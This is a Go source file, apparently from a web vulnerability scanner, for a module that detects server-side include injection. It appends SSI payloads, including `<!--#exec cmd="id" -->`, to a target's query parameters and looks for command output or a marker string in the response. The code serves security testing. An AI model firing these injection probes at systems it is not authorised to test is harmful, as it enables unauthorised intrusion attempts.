package core

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// SsiInjectionTestingResult holds the result of the SsiInjectionTesting module execution.
type SsiInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// SsiInjectionTesting executes the ssi_injection_testing security technique.
type SsiInjectionTesting struct {
	BaseModule
	Target  string
	results []SsiInjectionTestingResult

	attemptedProbes int64
	failedProbes    int64
}

// NewSsiInjectionTesting creates a new instance.
func NewSsiInjectionTesting(target string) *SsiInjectionTesting {
	return &SsiInjectionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *SsiInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var ssiPayloads = []string{
	`<!--#exec cmd="id" -->`,
	`<!--#set var="testvar" value="ssi_vuln_1337" --><!--#echo var="testvar" -->`,
}

// idRegex matches an `id` command output line. The character classes are
// bounded so prose that merely contains "uid=1000(alice) ... gid=1000(users)"
// far apart on the same line does not match.
var idRegex = regexp.MustCompile(`uid=\d+\([^)\r\n]{0,64}\)\s+gid=\d+\([^)\r\n]{0,64}\)`)

func (m *SsiInjectionTesting) Execute(ctx context.Context) ([]SsiInjectionTestingResult, error) {
	m.Mu.Lock()
	m.results = make([]SsiInjectionTestingResult, 0)
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(ssiPayloads))
	for _, p := range ssiPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for range m.MaxThreads {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, nil
	case <-ctx.Done():
		<-done
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, ctx.Err()
	}
}

// appendInconclusiveIfAllProbesFailed emits an inconclusive summary row when
// every probe ended in a transport failure, so an unreachable target is never
// reported as a clean scan.
func (m *SsiInjectionTesting) appendInconclusiveIfAllProbesFailed() {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if len(m.results) > 0 {
		return
	}
	attempted := atomic.LoadInt64(&m.attemptedProbes)
	if attempted > 0 && atomic.LoadInt64(&m.failedProbes) >= attempted {
		m.results = append(m.results, SsiInjectionTestingResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: formatEvidenceDetail(EvidenceWeak, "All SSI probes failed with transport errors or HTTP error responses; target reachability could not be established."),
		})
	}
}

func (m *SsiInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	atomic.AddInt64(&m.attemptedProbes, 1)

	query := u.Query()
	hasParams := len(query) > 0

	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("page", payload)
		query.Add("name", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	defer resp.Body.Close()

	// A 4xx/5xx response means the server rejected the document outright, so it
	// counts as an unusable probe; judging still proceeds in case the error body
	// leaks marker content (results short-circuit the summary below).
	if resp.StatusCode >= http.StatusBadRequest {
		atomic.AddInt64(&m.failedProbes, 1)
	}

	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}

	bodyStr := string(bodyBytes)

	// Payload-free fetch of the same URL serves as a baseline: a page that
	// already carries the markers (docs quoting `id` output, code samples)
	// cannot be claimed via payload reflection.
	baseReq, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseResp, err := m.Client.Do(baseReq)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseBytes, err := ReadBoundedBody(baseResp.Body, MaxResponseBodyBytes)
	baseResp.Body.Close()
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	baseStr := string(baseBytes)
	if idRegex.MatchString(baseStr) || strings.Contains(baseStr, "ssi_vuln_1337") {
		return
	}

	// Signatures for SSI execution. An HTML-escaped (or otherwise encoded)
	// echo of the marker is inert: escaping also transforms `testvar`, so both
	// must be absent for the marker to prove server-side execution.
	if idRegex.MatchString(bodyStr) ||
		(strings.Contains(bodyStr, "ssi_vuln_1337") &&
			!strings.Contains(bodyStr, "testvar") &&
			!strings.Contains(bodyStr, payload)) {
		m.Mu.Lock()
		summary := "SSI Injection detected. Command executed successfully with payload: " + payload
		detail := formatEvidenceDetail(EvidenceConfirmed, summary)
		m.RecordPoC(req, nil, detail)
		m.results = append(m.results, SsiInjectionTestingResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceConfirmed, false),
			Detail: detail,
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("ssi_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting SsiInjectionTesting on: %s", target))

		tester := NewSsiInjectionTesting(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
